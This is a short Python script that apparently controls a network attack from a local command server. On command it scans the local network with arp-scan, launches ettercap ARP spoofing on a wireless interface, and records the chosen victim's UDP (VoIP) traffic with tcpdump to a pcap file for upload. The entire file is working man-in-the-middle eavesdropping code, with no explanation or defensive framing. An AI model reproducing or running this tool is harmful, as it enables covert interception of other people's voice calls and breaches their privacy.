import os
import threading
import voip2server
import time
import requests

def arp_spoof():
    os.system('sudo lxterminal -e \'ettercap -T -Q -i wlan1 -M arp ;read\'')

def get_networks():
    os.system("sudo arp-scan -l > network.txt")
    voip2server.get_networks()

def voip_pattern(victim_ip):
    t1 = threading.Thread(target=arp_spoof,)		
    t1.start()
    os.system('sudo tcpdump -i wlan1 -G 120 -W 1 -s 0 -w test.pcap \'host %s and udp\'' %(victim_ip)) 
    voip2server.get_pcap()
def main():
    while(True):
        resp = requests.get("http://localhost:5000/getcommand")
        content = resp.content.decode("utf-8")
        if(content.find("network") >-1):
            get_networks()
        elif(content.find("target")):
            victim_ip = content.split("=")[1]
            voip_pattern(victim_ip)
        else:
            time.sleep(15)
